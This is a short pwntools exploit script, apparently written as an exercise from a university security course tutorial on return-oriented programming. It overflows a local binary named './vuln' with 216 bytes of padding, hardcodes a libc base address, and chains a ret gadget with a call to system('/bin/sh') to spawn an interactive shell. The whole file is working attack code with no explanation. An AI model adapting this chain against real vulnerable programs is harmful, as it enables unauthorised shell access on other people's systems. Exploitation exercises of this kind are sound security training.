from pwn import *
#p = process('./vuln')
context(os='linux',arch='amd64')
p = gdb.debug('./vuln','b main')
e = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
junk = b'A'*216
libc.address = 0x00007ffff7dc4000
r = ROP(libc)
r.system(next(libc.search(b"/bin/sh")))
ret_empty = r.find_gadget(['ret'])[0]
p.sendline(junk + p64(ret_empty) + r.chain())
p.interactive()
# https://tc.gts3.org/cs6265/tut/tut06-01-rop.html